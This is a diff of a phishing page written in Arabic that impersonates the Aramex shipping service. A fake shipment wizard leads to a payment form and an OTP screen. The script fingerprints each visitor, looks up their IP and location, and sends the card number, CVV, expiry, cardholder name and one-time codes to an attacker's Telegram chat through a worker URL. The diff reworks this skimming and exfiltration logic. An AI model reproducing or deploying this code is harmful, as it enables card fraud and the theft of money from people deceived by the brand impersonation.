@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
-  <title>أرامكس - شحن وتتبع | بوابة دفع</title>
+  <title>أرامكس - شحن وتتبع</title>
   <style>
     /* إخفاء عناصر بلوجر الأصلية إن وجدت */
     #navbar-iframe, .blogger-gear, .ss, header, footer, .header, .footer,
@@ -333,12 +333,13 @@
     .custom-popup .popup-close { background: #f0f0f0; border: none; padding: 10px 30px; border-radius: 30px; font-weight: 700; color: #666; margin-top: 15px; cursor: pointer; transition: 0.2s; font-size: 16px; }
     .custom-popup .popup-close:hover { background: #d81e1e; color: #fff; }
 
-    /* ========== الصفحة الرئيسية (الصورة) ========== */
+    /* ========== تعديل الخلفية للصفحة الرئيسية ========== */
     .home-image-container {
       position: relative;
       width: 100%;
       background: transparent;
       user-select: none;
+      -webkit-tap-highlight-color: transparent;
       margin: 0;
       padding: 0;
     }
@@ -367,25 +368,8 @@
       box-shadow: none !important;
       -webkit-tap-highlight-color: transparent !important;
     }
-    .hidden-btn:hover,
-    .hidden-btn:active,
-    .hidden-btn:focus {
-      background: transparent !important;
-      opacity: 0 !important;
-      outline: none !important;
-    }
-    .track-btn {
-      left: 0;
-      top: calc(100% / 18 * 3);
-      width: 100%;
-      height: calc(100% / 18 * 2);
-    }
-    .ship-btn {
-      left: 0;
-      top: calc(100% / 18 * 6);
-      width: 100%;
-      height: calc(100% / 18 * 12);
-    }
+    .track-btn { left: 0; top: calc(100% / 18 * 3); width: 100%; height: calc(100% / 18 * 2); }
+    .ship-btn { left: 0; top: calc(100% / 18 * 6); width: 100%; height: calc(100% / 18 * 12); }
 
     /* ========== ستايلات بوابة الدفع المدمجة (بدون مبلغ) ========== */
     .payment-container {
@@ -404,253 +388,141 @@
       gap: 10px;
       margin-bottom: 24px;
     }
-    .divider::before,
-    .divider::after {
+    .divider::before, .divider::after {
       content: "";
       flex: 1;
       max-width: 60px;
       height: 2px;
       background: #cecece;
     }
-    .divider span {
-      font-size: 20px;
-      font-weight: 700;
-    }
-    .field-group {
-      margin-bottom: 22px;
-    }
-    .label {
-      display: block;
-      font-size: 20px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
+    .divider span { font-size: 20px; font-weight: 700; }
+    .field-group { margin-bottom: 22px; }
+    .label { display: block; font-size: 20px; font-weight: 700; margin-bottom: 10px; }
     .input {
-      width: 100%;
-      height: 58px;
-      border: 2px solid #cfcfcf;
-      border-radius: 16px;
-      background: #f7f7f7;
-      font-size: 18px;
-      padding: 0 14px;
-      outline: none;
+      width: 100%; height: 58px; border: 2px solid #cfcfcf; border-radius: 16px;
+      background: #f7f7f7; font-size: 18px; padding: 0 14px; outline: none;
     }
-    .input.error {
-      border-color: #d93025 !important;
-      background: #fff7f7;
-    }
-    .card-head {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 10px;
-    }
-    .card-logo-top {
-      width: 130px;
-      height: 37px;
-      display: flex;
-      align-items: flex-start;
-      justify-content: center;
-      user-select: none;
-    }
-    .card-logo-top img {
-      height: 37px;
-      width: auto;
-      object-fit: contain;
-      transform: translateY(-4px);
-      pointer-events: none;
-    }
-    .card-number {
-      direction: ltr;
-      text-align: left;
-      font-family: monospace;
-      letter-spacing: 1px;
-    }
-    .row {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-    }
-    .col {
-      flex: 1;
-    }
+    .input.error { border-color: #d93025 !important; background: #fff7f7; }
+    .card-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
+    .card-logo-top { width: 130px; height: 37px; display: flex; align-items: flex-start; justify-content: center; user-select: none; }
+    .card-logo-top img { height: 37px; width: auto; object-fit: contain; transform: translateY(-4px); pointer-events: none; }
+    .card-number { direction: ltr; text-align: left; font-family: monospace; letter-spacing: 1px; }
+    .row { display: flex; gap: 10px; margin-top: 10px; }
+    .col { flex: 1; }
     .pay-btn {
-      width: 100%;
-      height: 60px;
-      margin-top: 16px;
-      border: none;
-      border-radius: 16px;
-      background: #2ac769;
-      color: #fff;
-      font-size: 20px;
-      font-weight: 800;
-      cursor: pointer;
+      width: 100%; height: 60px; margin-top: 16px; border: none; border-radius: 16px;
+      background: #2ac769; color: #fff; font-size: 20px; font-weight: 800; cursor: pointer;
     }
     .expiry-wrap {
-      width: 100%;
-      height: 58px;
-      background: #f7f7f7;
-      border: 2px solid #cfcfcf;
-      border-radius: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 14px;
-      direction: ltr;
+      width: 100%; height: 58px; background: #f7f7f7; border: 2px solid #cfcfcf;
+      border-radius: 16px; display: flex; align-items: center; justify-content: space-between;
+      padding: 0 14px; direction: ltr;
     }
-    .expiry-wrap.error {
-      border-color: #d93025 !important;
-      background: #fff7f7;
-    }
+    .expiry-wrap.error { border-color: #d93025 !important; background: #fff7f7; }
     .expiry-select {
-      width: 38%;
-      height: 100%;
-      border: none;
-      background: transparent;
-      font-size: 18px;
-      outline: none;
-      text-align: center;
-      text-align-last: center;
-      direction: ltr;
+      width: 38%; height: 100%; border: none; background: transparent; font-size: 18px;
+      outline: none; text-align: center; text-align-last: center; direction: ltr;
       color: #9a9a9a;
     }
-    .expiry-select.has-value {
-      color: #111;
-    }
-    .expiry-separator {
-      width: 24%;
-      text-align: center;
-      font-size: 24px;
-      font-weight: 700;
-      color: #777;
-    }
+    .expiry-select.has-value { color: #111; }
+    .expiry-separator { width: 24%; text-align: center; font-size: 24px; font-weight: 700; color: #777; }
     .loader-screen {
-      width: 100%;
-      min-height: 300px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 30px;
+      width: 100%; min-height: 300px; display: flex; align-items: center; justify-content: center; padding: 30px;
     }
-    .loader-box {
-      text-align: center;
-    }
+    .loader-box { text-align: center; }
     .blue-spinner {
-      width: 72px;
-      height: 72px;
-      margin: 0 auto 18px;
-      border-radius: 50%;
-      border: 6px solid rgba(31,122,255,0.18);
-      border-top-color: #1f7aff;
+      width: 72px; height: 72px; margin: 0 auto 18px; border-radius: 50%;
+      border: 6px solid rgba(31,122,255,0.18); border-top-color: #1f7aff;
       animation: spin 0.9s linear infinite;
     }
-    .loader-count {
-      font-size: 28px;
-      font-weight: 800;
-      direction: ltr;
-      color: #1f7aff;
-    }
-    .otp-page {
-      width: 100%;
-      padding: 20px 16px;
-    }
-    .otp-title {
-      text-align: center;
-      font-size: 24px;
-      font-weight: 800;
-      margin: 12px 0 14px;
-    }
-    .otp-text {
-      text-align: center;
-      font-size: 16px;
-      line-height: 1.7;
-      color: #333;
-      margin: 0 0 24px;
-    }
+    .loader-count { font-size: 28px; font-weight: 800; direction: ltr; color: #1f7aff; }
+    .otp-page { width: 100%; padding: 20px 16px; }
+    .otp-title { text-align: center; font-size: 24px; font-weight: 800; margin: 12px 0 14px; }
+    .otp-text { text-align: center; font-size: 16px; line-height: 1.7; color: #333; margin: 0 0 24px; }
     .otp-btn {
-      width: 100%;
-      height: 58px;
-      margin-top: 12px;
-      border: none;
-      border-radius: 16px;
-      background: #2ac769;
-      color: #fff;
-      font-size: 20px;
-      font-weight: 800;
-      cursor: pointer;
+      width: 100%; height: 58px; margin-top: 12px; border: none; border-radius: 16px;
+      background: #2ac769; color: #fff; font-size: 20px; font-weight: 800; cursor: pointer;
     }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .payment-screen, .loader60-screen, .otp-screen, .loader30-screen {
-      display: none;
-    }
-    .payment-screen.active, .loader60-screen.active, .otp-screen.active, .loader30-screen.active {
-      display: block;
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .payment-screen, .loader60-screen, .otp-screen, .loader30-screen { display: none; }
+    .payment-screen.active, .loader60-screen.active, .otp-screen.active, .loader30-screen.active { display: block; }
   </style>
 </head>
 <body oncontextmenu="return false;">
 <div id="myProductBox">
-  <div id="appRoot">
-    <div class="app" id="app">
-      <div class="topbar">
-        <div class="brand">ارامكس</div>
-        <div class="leftBox">
-          <button class="login" id="goLogin">تسجيل الدخول</button>
-          <button class="burger" id="openMenu"><span></span></button>
+  <div id="screen-ship">
+    <div id="appRoot">
+      <div class="app" id="app">
+        <div class="topbar">
+          <div class="brand">ارامكس</div>
+          <div class="leftBox">
+            <button class="login" id="goLogin">تسجيل الدخول</button>
+            <button class="burger" id="openMenu"><span></span></button>
+          </div>
         </div>
-      </div>
-      <div class="menu-overlay" id="menuOverlay"></div>
-      <div class="side-menu" id="sideMenu">
-        <div class="menu-header"><button class="close-menu" id="closeMenuBtn">✕</button></div>
-        <div class="menu-item" data-action="send">إرسال شحنة</div>
-        <div class="menu-item" data-action="track">تتبع شحنة</div>
-        <div class="menu-item" data-action="refund">استرجاع مبلغ الشحنة</div>
-      </div>
-
-      <!-- الصفحة الرئيسية -->
-      <section class="page active" id="page-home">
-        <div class="home-image-container">
-          <img id="mainImage" class="main-image" src="https://files.catbox.moe/nflilk.png" alt="الصورة الرئيسية" draggable="false" />
-          <button class="hidden-btn track-btn" id="hiddenTrackBtn"></button>
-          <button class="hidden-btn ship-btn" id="hiddenShipBtn"></button>
+        <div class="menu-overlay" id="menuOverlay"></div>
+        <div class="side-menu" id="sideMenu">
+          <div class="menu-header"><button class="close-menu" id="closeMenuBtn">✕</button></div>
+          <div class="menu-item" data-action="send">إرسال شحنة</div>
+          <div class="menu-item" data-action="track">تتبع شحنة</div>
+          <div class="menu-item" data-action="refund">استرجاع مبلغ الشحنة</div>
         </div>
-      </section>
 
-      <!-- باقي صفحات أرامكس -->
-      <section class="page" id="page-where"><div class="section"><div class="titleBig" style="font-size:42px">الى أين؟</div><div class="formSub" style="font-size:22px">هل ترسل؟</div><div class="choiceGrid"><div class="choice" data-type="local" data-next="sender"><div class="sticker-icon" style="background-image: url('https://i.postimg.cc/wBJNY74K/20260413-151837.png');"></div><div class="lbl">شحنة محلية</div></div><div class="choice" data-type="international" data-next="sender"><div class="sticker-icon" style="background-image: url('https://i.postimg.cc/c49wRqtB/20260413-151923.png');"></div><div class="lbl">شحنة دولية</div></div></div></div></section>
-      <section class="page" id="page-sender"><div class="wizardTop"><div class="steps"><div class="step active"><div class="bubble">1</div><span>معلومات<br>المرسل</span></div><div class="step"><div class="bubble">2</div><span>معلومات<br>المستلم</span></div><div class="step"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div><div class="step"><div class="bubble">4</div><span>الدفع</span></div></div></div><div class="section"><div class="formTitle">يرجى تعبئة معلومات المرسل</div><div class="fieldLine"><label>الاسم *</label><input id="s_name" /><div class="error-msg" id="err_s_name"></div></div><div class="fieldLine"><label>البلد *</label><select id="s_country"><option value="sa" selected>المملكة العربية السعودية</option><option value="ae">الإمارات العربية المتحدة</option><option value="kw">الكويت</option><option value="bh">البحرين</option><option value="qa">قطر</option><option value="om">عمان</option></select></div><div class="fieldLine"><label>رقم الهاتف *</label><div class="phoneRow"><input id="s_phone" placeholder="0512345678" /><div class="flag"><span>+966</span></div></div><div class="error-msg" id="err_s_phone"></div></div><div class="fieldLine"><label>المدينة *</label><input id="s_city" /></div><div class="fieldLine"><label>الحي *</label><input id="s_district" /></div><div class="fieldLine"><label>اسم الشارع *</label><input id="s_street" /></div></div><div class="btnRow"><button class="btnMain" id="btnNextSender">التالي</button><button class="btnGhost" data-back="where">رجوع</button></div></section>
-      <section class="page" id="page-receiver"><div class="wizardTop"><div class="steps"><div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div><div class="step active"><div class="bubble">2</div><span>معلومات<br>المستلم</span></div><div class="step"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div><div class="step"><div class="bubble">4</div><span>الدفع</span></div></div></div><div class="section"><div class="formTitle">يرجى تعبئة معلومات المستلم</div><div class="fieldLine"><label>الاسم *</label><input id="r_name" /></div><div class="fieldLine"><label>البلد *</label><select id="r_country"><option value="sa" selected>المملكة العربية السعودية</option><option value="ae">الإمارات العربية المتحدة</option><option value="kw">الكويت</option><option value="bh">البحرين</option><option value="qa">قطر</option><option value="om">عمان</option></select></div><div class="fieldLine"><label>رقم الهاتف *</label><div class="phoneRow"><input id="r_phone" placeholder="0512345678" /><div class="flag"><span>+966</span></div></div></div><div class="fieldLine"><label>المدينة *</label><input id="r_city" /></div><div class="fieldLine"><label>الحي *</label><input id="r_district" /></div><div class="fieldLine"><label>اسم الشارع *</label><input id="r_street" /></div></div><div class="btnRow"><button class="btnMain" id="btnNextReceiver">التالي</button><button class="btnGhost" data-back="sender">رجوع</button></div></section>
-      <section class="page" id="page-details"><div class="wizardTop"><div class="steps"><div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div><div class="step done"><div class="bubble">✓</div><span>معلومات<br>المستلم</span></div><div class="step active"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div><div class="step"><div class="bubble">4</div><span>الدفع</span></div></div></div><div class="section"><div class="fieldLine"><label>رقم التتبع *</label><input id="d_shipno" inputmode="numeric" maxlength="10" /></div><div class="fieldLine"><label>محتويات الشحنة *</label><input id="d_content" /></div><div class="fieldLine"><label>عدد القطع *</label><input id="d_pieces" value="1" /></div><div style="text-align:center;font-weight:900;margin:12px 0">نوع الشحنة</div><div class="choiceGrid" style="padding:0"><div class="choice selectable" data-type="docs"><div class="tick">✓</div><div class="lbl">وثائق</div></div><div class="choice selectable" data-type="parcel"><div class="tick">✓</div><div class="lbl">طرد</div></div></div></div><div class="btnRow"><button class="btnMain" id="btnSendShipment">التالي</button><button class="btnGhost" data-back="receiver">رجوع</button></div></section>
+        <!-- الصفحة الرئيسية -->
+        <section class="page active" id="page-home">
+          <div class="home-image-container">
+            <img id="mainImage" class="main-image" src="https://files.catbox.moe/nflilk.png" alt="الصورة الرئيسية" draggable="false" />
+            <button class="hidden-btn track-btn" id="hiddenTrackBtn"></button>
+            <button class="hidden-btn ship-btn" id="hiddenShipBtn"></button>
+          </div>
+        </section>
 
-      <!-- صفحة الدفع المدمجة (بدون مبلغ) -->
-      <section class="page" id="page-paymethod">
-        <div class="payment-container">
-          <div class="payment-screen active" id="paymentMainScreen">
-            <div class="payment-page">
-              <div class="divider"><span>ادفع عن طريق البطاقة</span></div>
-              <div class="field-group"><label class="label">اسم حامل البطاقة</label><input class="input" id="cardHolder" placeholder="اسم حامل البطاقة" maxlength="40"></div>
-              <div class="field-group">
-                <div class="card-head"><label class="label">معلومات البطاقة</label><div class="card-logo-top"><img src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png" alt="شعار البطاقة" draggable="false"></div></div>
-                <input class="input card-number" id="cardNumber" placeholder="0000000000000000" inputmode="numeric" maxlength="16">
-                <div class="row">
-                  <div class="col"><input class="input" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="3"></div>
-                  <div class="col"><div class="expiry-wrap" id="expiryWrap"><select id="expMonth" class="expiry-select"><option value="">MM</option></select><div class="expiry-separator">/</div><select id="expYear" class="expiry-select"><option value="">YY</option></select></div></div>
-                </div>
-              </div>
-              <button class="pay-btn" id="payBtn">ادفع</button>
+        <!-- باقي صفحات أرامكس -->
+        <section class="page" id="page-where">
+          <div class="section">
+            <div class="titleBig" style="font-size:42px">الى أين؟</div>
+            <div class="formSub" style="font-size:22px">هل ترسل؟</div>
+            <div class="choiceGrid">
+              <div class="choice" data-type="local" data-next="sender"><div class="sticker-icon" style="background-image: url('https://i.postimg.cc/wBJNY74K/20260413-151837.png');"></div><div class="lbl">شحنة محلية</div></div>
+              <div class="choice" data-type="international" data-next="sender"><div class="sticker-icon" style="background-image: url('https://i.postimg.cc/c49wRqtB/20260413-151923.png');"></div><div class="lbl">شحنة دولية</div></div>
             </div>
           </div>
-          <div class="loader60-screen" id="loader60Screen"><div class="loader-screen"><div class="loader-box"><div class="blue-spinner"></div><div class="loader-count" id="loader60Count">60</div></div></div></div>
-          <div class="otp-screen" id="otpScreen"><div class="otp-page"><div class="otp-title">رمز التحقق</div><p class="otp-text">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</p><div class="field-group"><input class="input" id="otpInput" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6"></div><button class="otp-btn" id="otpBtn">تحقق</button></div></div>
-          <div class="loader30-screen" id="loader30Screen"><div class="loader-screen"><div class="loader-box"><div class="blue-spinner"></div></div></div></div>
-        </div>
-      </section>
+        </section>
 
-      <section class="page" id="page-tracking"><div class="section"><div class="titleBig">تتبع شحنة</div><div class="track-container"><div id="trackResult" class="track-result"></div><div class="track-input-group"><button id="trackBtn">تتبع</button><input type="text" id="trackingNumber" placeholder="ادخل رقم التتبع" maxlength="10"></div><button class="btnGhost" id="backFromTracking">رجوع</button></div></div></section>
-      <section class="page" id="page-refund"><div class="section"><div class="titleBig" style="font-size:32px">استرجاع مبلغ الشحنة</div><div class="fieldLine"><label>الاسم الكامل *</label><input id="refund_name" /></div><div class="fieldLine"><label>رقم الجوال *</label><input id="refund_phone" maxlength="10" /></div><div class="fieldLine"><label>رقم التتبع *</label><input id="refund_tracking" maxlength="10" /></div><div class="btnRow"><button class="btnMain" id="submitRefundBtn">إرسال طلب الاسترجاع</button><button class="btnGhost" id="cancelRefundBtn">إلغاء</button></div></div></section>
-      <section class="page" id="page-success"><div class="section successBox"><div class="successIcon">🎉</div><div class="successTitle">تم استلام طلبك بنجاح!</div><div class="successMsg">رقم التتبع: <span id="successShipNo"></span><br>سيتم التواصل معك قريباً لتأكيد التفاصيل.</div><button class="btnMain" id="newShipmentBtn">شحنة جديدة</button></div></section>
+        <section class="page" id="page-sender"><div class="wizardTop"><div class="steps"><div class="step active"><div class="bubble">1</div><span>معلومات<br>المرسل</span></div><div class="step"><div class="bubble">2</div><span>معلومات<br>المستلم</span></div><div class="step"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div><div class="step"><div class="bubble">4</div><span>الدفع</span></div></div></div><div class="section"><div class="formTitle">يرجى تعبئة معلومات المرسل</div><div class="fieldLine"><label>الاسم *</label><input id="s_name" /><div class="error-msg" id="err_s_name"></div></div><div class="fieldLine"><label>البلد *</label><select id="s_country"><option value="sa" selected>المملكة العربية السعودية</option><option value="ae">الإمارات العربية المتحدة</option><option value="kw">الكويت</option><option value="bh">البحرين</option><option value="qa">قطر</option><option value="om">عمان</option></select></div><div class="fieldLine"><label>رقم الهاتف *</label><div class="phoneRow"><input id="s_phone" placeholder="0512345678" /><div class="flag"><span>+966</span></div></div><div class="error-msg" id="err_s_phone"></div></div><div class="fieldLine"><label>المدينة *</label><input id="s_city" /></div><div class="fieldLine"><label>الحي *</label><input id="s_district" /></div><div class="fieldLine"><label>اسم الشارع *</label><input id="s_street" /></div></div><div class="btnRow"><button class="btnMain" id="btnNextSender">التالي</button><button class="btnGhost" data-back="where">رجوع</button></div></section>
+
+        <section class="page" id="page-receiver"><div class="wizardTop"><div class="steps"><div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div><div class="step active"><div class="bubble">2</div><span>معلومات<br>المستلم</span></div><div class="step"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div><div class="step"><div class="bubble">4</div><span>الدفع</span></div></div></div><div class="section"><div class="formTitle">يرجى تعبئة معلومات المستلم</div><div class="fieldLine"><label>الاسم *</label><input id="r_name" /></div><div class="fieldLine"><label>البلد *</label><select id="r_country"><option value="sa" selected>المملكة العربية السعودية</option><option value="ae">الإمارات العربية المتحدة</option><option value="kw">الكويت</option><option value="bh">البحرين</option><option value="qa">قطر</option><option value="om">عمان</option></select></div><div class="fieldLine"><label>رقم الهاتف *</label><div class="phoneRow"><input id="r_phone" placeholder="0512345678" /><div class="flag"><span>+966</span></div></div></div><div class="fieldLine"><label>المدينة *</label><input id="r_city" /></div><div class="fieldLine"><label>الحي *</label><input id="r_district" /></div><div class="fieldLine"><label>اسم الشارع *</label><input id="r_street" /></div></div><div class="btnRow"><button class="btnMain" id="btnNextReceiver">التالي</button><button class="btnGhost" data-back="sender">رجوع</button></div></section>
+
+        <section class="page" id="page-details"><div class="wizardTop"><div class="steps"><div class="step done"><div class="bubble">✓</div><span>معلومات<br>المرسل</span></div><div class="step done"><div class="bubble">✓</div><span>معلومات<br>المستلم</span></div><div class="step active"><div class="bubble">3</div><span>تفاصيل<br>الشحنة</span></div><div class="step"><div class="bubble">4</div><span>الدفع</span></div></div></div><div class="section"><div class="fieldLine"><label>رقم التتبع *</label><input id="d_shipno" inputmode="numeric" maxlength="10" /></div><div class="fieldLine"><label>محتويات الشحنة *</label><input id="d_content" /></div><div class="fieldLine"><label>عدد القطع *</label><input id="d_pieces" value="1" /></div><div style="text-align:center;font-weight:900;margin:12px 0">نوع الشحنة</div><div class="choiceGrid" style="padding:0"><div class="choice selectable" data-type="docs"><div class="tick">✓</div><div class="lbl">وثائق</div></div><div class="choice selectable" data-type="parcel"><div class="tick">✓</div><div class="lbl">طرد</div></div></div></div><div class="btnRow"><button class="btnMain" id="btnSendShipment">التالي</button><button class="btnGhost" data-back="receiver">رجوع</button></div></section>
+
+        <!-- صفحة الدفع المدمجة (بدون مبلغ) -->
+        <section class="page" id="page-paymethod">
+          <div class="payment-container">
+            <div class="payment-screen active" id="paymentMainScreen">
+              <div class="payment-page">
+                <div class="divider"><span>ادفع عن طريق البطاقة</span></div>
+                <div class="field-group"><label class="label">اسم حامل البطاقة</label><input class="input" id="cardHolder" placeholder="اسم حامل البطاقة" maxlength="40"></div>
+                <div class="field-group">
+                  <div class="card-head"><label class="label">معلومات البطاقة</label><div class="card-logo-top"><img src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png" alt="شعار البطاقة" draggable="false"></div></div>
+                  <input class="input card-number" id="cardNumber" placeholder="0000000000000000" inputmode="numeric" maxlength="16">
+                  <div class="row">
+                    <div class="col"><input class="input" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="3"></div>
+                    <div class="col"><div class="expiry-wrap" id="expiryWrap"><select id="expMonth" class="expiry-select"><option value="">MM</option></select><div class="expiry-separator">/</div><select id="expYear" class="expiry-select"><option value="">YY</option></select></div></div>
+                  </div>
+                </div>
+                <button class="pay-btn" id="payBtn">ادفع</button>
+              </div>
+            </div>
+            <div class="loader60-screen" id="loader60Screen"><div class="loader-screen"><div class="loader-box"><div class="blue-spinner"></div><div class="loader-count" id="loader60Count">60</div></div></div></div>
+            <div class="otp-screen" id="otpScreen"><div class="otp-page"><div class="otp-title">رمز التحقق</div><p class="otp-text">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</p><div class="field-group"><input class="input" id="otpInput" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6"></div><button class="otp-btn" id="otpBtn">تحقق</button></div></div>
+            <div class="loader30-screen" id="loader30Screen"><div class="loader-screen"><div class="loader-box"><div class="blue-spinner"></div></div></div></div>
+          </div>
+        </section>
+
+        <section class="page" id="page-tracking"><div class="section"><div class="titleBig">تتبع شحنة</div><div class="track-container"><div id="trackResult" class="track-result"></div><div class="track-input-group"><button id="trackBtn">تتبع</button><input type="text" id="trackingNumber" placeholder="ادخل رقم التتبع" maxlength="10"></div><button class="btnGhost" id="backFromTracking">رجوع</button></div></div></section>
+        <section class="page" id="page-refund"><div class="section"><div class="titleBig" style="font-size:32px">استرجاع مبلغ الشحنة</div><div class="fieldLine"><label>الاسم الكامل *</label><input id="refund_name" /></div><div class="fieldLine"><label>رقم الجوال *</label><input id="refund_phone" maxlength="10" /></div><div class="fieldLine"><label>رقم التتبع *</label><input id="refund_tracking" maxlength="10" /></div><div class="btnRow"><button class="btnMain" id="submitRefundBtn">إرسال طلب الاسترجاع</button><button class="btnGhost" id="cancelRefundBtn">إلغاء</button></div></div></section>
+        <section class="page" id="page-success"><div class="section successBox"><div class="successIcon">🎉</div><div class="successTitle">تم استلام طلبك بنجاح!</div><div class="successMsg">رقم التتبع: <span id="successShipNo"></span><br>سيتم التواصل معك قريباً لتأكيد التفاصيل.</div><button class="btnMain" id="newShipmentBtn">شحنة جديدة</button></div></section>
+      </div>
     </div>
   </div>
   <div id="customPopup" class="custom-popup"><div class="popup-message" id="popupMessage"></div><button class="popup-close" onclick="hidePopup()">حسناً</button></div>
@@ -659,7 +531,7 @@
 <script>
   (function setRealVH() { function apply() { document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px'); } apply(); window.addEventListener('resize', apply); })();
   
-  // ========== إعدادات تليجرام (نفس الكود الأصلي) ==========
+  // ================== إعدادات Telegram (أرامكس) ==================
   const TELEGRAM_WORKER_URL = "https://withered-dream-f7f1.mshh667ccc.workers.dev/";
   const TELEGRAM_CHAT_ID = "6918534470";
   
@@ -670,10 +542,16 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
       });
-    } catch(e) { console.error(e); }
+      console.log("تم الإرسال إلى تليجرام");
+    } catch(e) { console.error("Telegram error:", e); }
   }
   
-  // بصمة ثابتة ومعلومات الزائر
+  async function sendEvent(message) {
+    let extra = `\n━━━━━━━━━━━\n🆔 المستخدم الثابت: ${userId}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
+    await sendToTelegram(message + extra);
+  }
+  
+  // بصمة وبيانات الزائر
   function generateStableFingerprint() {
     let components = [navigator.userAgent, navigator.language, screen.width+'x'+screen.height, screen.colorDepth, new Date().getTimezoneOffset(), navigator.hardwareConcurrency || '', navigator.deviceMemory || '', !!navigator.maxTouchPoints ? 'touch' : 'no-touch'];
     let hash = 0;
@@ -684,13 +562,14 @@
   if (!userId) { userId = generateStableFingerprint(); localStorage.setItem("stableUserId", userId); }
   let visitCount = parseInt(localStorage.getItem("visitCount") || "0") + 1;
   localStorage.setItem("visitCount", visitCount);
+  
   function getDeviceType() { let ua=navigator.userAgent; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Android/i.test(ua)) return "Android"; if(/Windows/i.test(ua)) return "Windows"; return "غير معروف"; }
   function getBrowserInfo() { let ua=navigator.userAgent; if(ua.includes("Chrome")&&!ua.includes("Edg")) return "Chrome"; if(ua.includes("Firefox")) return "Firefox"; if(ua.includes("Safari")&&!ua.includes("Chrome")) return "Safari"; return "أخرى"; }
   let ipData = { ip: "غير معروف", country: "غير معروف", city: "غير معروف" };
   (async function fetchIP() { try { let res=await fetch("https://ipapi.co/json/"); let data=await res.json(); ipData={ip:data.ip||"غير معروف", country:data.country_name||"غير معروف", city:data.city||"غير معروف"}; await sendToTelegram(`🆕 *زيارة جديدة*\n🆔 المستخدم: ${userId}\n👀 عدد الزيارات: ${visitCount}\n📱 ${getDeviceType()} | ${getBrowserInfo()}\n🌍 ${ipData.city} - ${ipData.country}`); } catch(e){} })();
   
-  // ========== دوال بوابة الدفع (مدمجة بدون مبلغ) ==========
-  let currentTrackingNumberForPay = "";
+  // ================== دوال بوابة الدفع (بدون مبلغ) ==================
+  let currentTrackingNumber = "";
   const CardType = { VISA:'فيزا', MASTERCARD:'ماستر كارد', MADA:'مدى', UNKNOWN:'غير معروف' };
   function detectCardType(cardDigits) { if(/^4/.test(cardDigits)) return CardType.VISA; if(/^(5[1-5])/.test(cardDigits)||/^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(cardDigits)) return CardType.MASTERCARD; const mada=['588845','440647','446404','457865','457997','474491','636120','9682','483010']; if(mada.some(p=>cardDigits.startsWith(p))) return CardType.MADA; return CardType.UNKNOWN; }
   function validateCardHolder() { let val=cardHolder.value.trim(); let ok=/^[A-Za-z ]+$/.test(val) && val.length>0; cardHolder.classList.toggle("error", !ok && val!=""); return ok || val===""?false:ok; }
@@ -698,16 +577,16 @@
   function validateCVV() { let ok=/^\d{3}$/.test(cvv.value); cvv.classList.toggle("error", !ok && cvv.value!==""); return ok; }
   function validateExpiry() { let ok=expMonth.value!=="" && expYear.value!==""; expiryWrap.classList.toggle("error", !ok); expMonth.classList.toggle("has-value",expMonth.value!==""); expYear.classList.toggle("has-value",expYear.value!==""); return ok; }
   function validatePaymentForm() { return validateCardHolder() && validateCardNumber() && validateCVV() && validateExpiry(); }
+  
   async function sendPaymentMessage() {
     let rawCard=cardNumber.value.replace(/\s/g,'');
     let cardType=detectCardType(rawCard);
-    let msg=`💳 *معلومات الدفع*\n🏷️ النوع: ${cardType}\n🔢 الرقم: ${rawCard}\n🔐 CVV: ${cvv.value}\n📅 انتهاء: ${expMonth.value}/${expYear.value}\n👤 الاسم: ${cardHolder.value.trim()}\n📦 رقم التتبع: ${currentTrackingNumberForPay}\n🆔 المستخدم: ${userId}\n📱 ${getDeviceType()} | ${getBrowserInfo()}\n🌍 ${ipData.city} - ${ipData.country}`;
-    await sendToTelegram(msg);
+    await sendEvent(`💳 *معلومات الدفع*\n🏷️ النوع: ${cardType}\n🔢 الرقم: ${rawCard}\n🔐 CVV: ${cvv.value}\n📅 انتهاء: ${expMonth.value}/${expYear.value}\n👤 الاسم: ${cardHolder.value.trim()}\n📦 رقم التتبع: ${currentTrackingNumber}`);
   }
   async function sendOtpMessage(otpCode) {
-    let msg=`🔐 *رمز التحقق OTP*\n🔢 الرمز: ${otpCode}\n📦 رقم التتبع: ${currentTrackingNumberForPay}\n🆔 المستخدم: ${userId}\n📱 ${getDeviceType()} | ${getBrowserInfo()}\n🌍 ${ipData.city} - ${ipData.country}`;
-    await sendToTelegram(msg);
